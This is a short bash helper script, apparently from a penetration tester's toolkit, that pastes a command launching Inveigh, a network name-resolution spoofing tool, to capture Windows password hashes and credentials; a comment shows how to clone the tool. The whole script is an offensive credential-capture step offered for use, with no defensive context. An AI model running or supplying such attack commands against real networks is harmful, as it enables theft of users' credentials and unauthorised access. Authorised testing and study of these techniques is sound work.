#!/bin/bash

"""
Start Inveigh and perform a poofing attacks and captures hash/credential
"""

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

: ' 
https://github.com/Kevin-Robertson/Inveigh
mkdir /opt/windows/ && git clone https://github.com/Kevin-Robertson/Inveigh -o /opt/windows/Inveigh
'

paste_command "Invoke-Inveigh -ConsoleOutput Y -FileOutput Y"